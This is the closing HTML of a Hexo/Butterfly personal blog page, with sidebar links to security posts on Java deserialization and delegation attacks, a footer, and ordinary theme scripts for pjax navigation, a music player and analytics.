title="java反序列化"><img src="https://www.toopic.cn/public/uploads/small/1658046551609165804655140.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java反序列化"/></a><div class="content"><a class="title" href="/2024/06/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化">java反序列化</a><time datetime="2024-06-29T13:35:45.000Z" title="发表于 2024-06-29 21:35:45">2024-06-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/11/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" title="委派攻击"><img src="https://www.toopic.cn/public/uploads/small/1704296973365170429697372.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="委派攻击"/></a><div class="content"><a class="title" href="/2024/06/11/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" title="委派攻击">委派攻击</a><time datetime="2024-06-11T06:56:21.000Z" title="发表于 2024-06-11 14:56:21">2024-06-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://www.toopic.cn/public/uploads/small/1712590412910171259041279.png')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> willsafe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.<p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2771052201" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-lrctype="1" data-preload="none" data-autoplay="true" muted></div><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script id="canvas_nest" defer="defer" color="67,233,186" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
